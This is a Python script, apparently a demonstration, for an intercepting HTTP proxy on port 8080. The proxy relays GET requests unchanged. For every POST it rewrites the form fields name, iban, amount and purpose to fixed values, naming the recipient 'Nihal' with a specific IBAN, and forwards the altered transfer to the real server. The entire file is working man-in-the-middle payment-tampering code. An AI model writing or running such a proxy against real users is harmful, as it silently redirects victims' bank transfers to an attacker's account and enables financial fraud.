import http.server
import socketserver
import urllib.request

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        req = urllib.request.urlopen(self.path)
        self.send_response(req.getcode())
        self.end_headers()
        self.wfile.write(req.read())

    def do_POST(self):
        
        length = int(self.headers['Content-Length'])
        payload = self.rfile.read(length)

        payload = urllib.parse.parse_qs(payload)
        print(payload)

        
        payload[b'name'] = [b'Nihal'] # "b" 
        payload[b'iban'] = [b'DE1324567890135792000']
        payload[b'amount'] = [b'499']
        payload[b'purpose'] = [b'Danke']
        print(payload)

        
        payload = urllib.parse.urlencode(payload, doseq=True).encode()

        self.headers['Content-Length'] = str(len(payload))
        
        req = urllib.request.Request(self.path, data=payload, headers=self.headers, method="POST")
        res = urllib.request.urlopen(req)

        self.send_response(res.getcode())
        self.end_headers()
        self.wfile.write(res.read())
        
# Start the server
try:
    socketserver.TCPServer(('', 8080), MyHTTPRequestHandler).serve_forever()
except Exception as e:
    print(e)